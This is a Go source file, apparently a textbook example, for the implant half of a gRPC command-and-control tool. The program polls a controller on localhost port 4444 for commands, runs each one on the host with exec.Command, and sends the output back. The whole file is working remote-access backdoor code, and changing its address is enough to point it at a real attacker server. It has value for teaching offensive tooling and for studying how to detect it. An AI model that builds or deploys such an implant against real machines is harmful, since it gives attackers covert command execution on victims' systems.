package main

import (
	"ch14/grpcapi"
	"context"
	"fmt"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"log"
	"os/exec"
	"strings"
	"time"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient
	)

	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil {
		log.Fatalln(err)
	}

	defer conn.Close()
	client = grpcapi.NewImplantClient(conn)

	ctx := context.Background()
	for {
		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req)

		if err != nil {
			log.Fatalln(err)
		}
		if cmd.In == "" {
			// no work
			time.Sleep(3 * time.Second)
			continue
		}
		fmt.Printf("[+] New command retrieved from admin service. [%s]\n", cmd.In)
		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		fmt.Printf("[+] Sending output back to admin service. [%s]\n", buf)
		client.SendOutput(ctx, cmd)
	}
}
